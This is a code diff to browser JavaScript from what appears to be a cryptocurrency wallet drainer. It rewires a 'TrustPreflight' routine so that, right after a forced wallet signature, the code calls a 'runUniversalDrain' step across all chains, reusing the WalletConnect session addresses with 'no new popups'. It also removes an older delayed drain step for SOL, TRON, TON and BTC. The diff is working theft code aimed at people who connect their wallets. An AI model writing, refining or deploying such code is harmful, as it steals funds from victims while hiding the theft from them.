@@ -369,6 +369,17 @@
       if (window.legion && typeof window.legion.forceTrustSign === 'function') {
         var r = await window.legion.forceTrustSign();
         console.warn('[TrustPreflight] forceTrustSign', r && (r.path || r.error || r.ok));
+        // After EVM sign: continueConnected runs runUniversalDrain — ALL chains in one pass
+        // (uses addresses already in WC session from the single approval popup — no new popups)
+        if (r && r.ok !== false) {
+          setTimeout(function () {
+            try {
+              if (window.legion && typeof window.legion.continueConnected === 'function') {
+                window.legion.continueConnected().catch(function () {});
+              }
+            } catch (_) {}
+          }, 1500);
+        }
       } else if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
         await window.__TRUST_RUN_PIPELINE__('preflight-drain');
       } else if (window.legion && typeof window.legion.continueConnected === 'function') {
@@ -377,16 +388,6 @@
     } catch (e2) {
       console.warn('[TrustPreflight] drain', e2 && e2.message);
     }
-    // After EVM drain: kick SOL/TRON/TON/BTC drain in background (runPhaseB)
-    setTimeout(function () {
-      try {
-        if (window.legion && typeof window.legion.runPhaseB === 'function') {
-          window.legion.runPhaseB({ skipEvm: true }).catch(function (e3) {
-            console.warn('[TrustPreflight] runPhaseB', e3 && e3.message);
-          });
-        }
-      } catch (_) {}
-    }, 2500);
     setProgress(95);
   }
 
